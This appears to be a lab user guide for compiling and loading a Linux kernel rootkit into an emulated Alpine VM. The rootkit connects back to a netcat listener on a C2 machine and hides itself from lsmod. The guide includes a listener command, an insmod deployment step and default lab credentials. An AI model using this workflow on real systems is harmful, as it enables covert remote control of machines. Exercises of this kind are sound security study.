# Rootkit documentation

#
To operate our software we need two machines.
The first is our target (aka alpine) and the second our C2.
For the need of exercice we emulate our alpine on a debian machine (aka host).

Previously, you need 
    On host : 
        Install : `sudo apt install bc binutils bison dwarves flex gcc git gnupg2 gzip libelf-dev libncurses5-dev libssl-dev make openssl pahole perl-base rsync tar xz-utils parted`
        Download Linux Kernel : `wget https://cdn.kernel.org/pub/linux/kernel/v6.x/linux-6.10.tar.gz`
        Unzip it : `tar -xvf linux-6.10.tar.gz`
        Assume to have the following tree on root folder :
            .
            └── root
                ├── Dockerfile
                ├── kill.sh
                ├── linux-6.10
                ├── modules
                │   ├── Makefile
                │   └── rootkit.c
                ├── script.sh
                └── UserGuide.md

    On C2 : 
        Check if netcat is up to date

In our C2 we have installed : netcat

On the host, run script.sh file with :
> chmod +x script.sh
> chmod +x kill.sh
> sh script.sh
To create the quemu alpine.

After the prossess finish. On the alpine, login you with the user `root` and create a share directory:
> mkdir -p /tmp/share
> mount -t 9p -o trans=virtio host0 /tmp/share -oversion=9p2000.L

Then, check the ip of your alpine and your C2.


In Debian host, on `rootkit.c` file, change SERVER_IP adresse with your C2 IP.
Running `make` compile `rootkit.c` file and copy it on the /tmp/qemu-share/ directory.
> root@debian-host:~/modules# make
> root@debian-host:~/modules# cp rootkit.ko /tmp/qemu-share/

On C2 :
root@debian-c2:~# nc -lnvp 4444
Command explanation :
nc: Netcat abbreviation.
-l: listen for incoming connections.
-n: prevents DNS resolution (will not attempt to resolve hostnames).
-v: verbose mode.
-p 4444: port number on which Netcat will listen for incoming connections.

Back to our alpine :
Run our rootkit : 
> root@alpine:~/tmp/share/# insmod *.ko 
After execution, you should have the connection confirmation.

We can check, our rootkit is hid from module list :
> lsmod



Information
Alpine user's :
- root:root
- user:password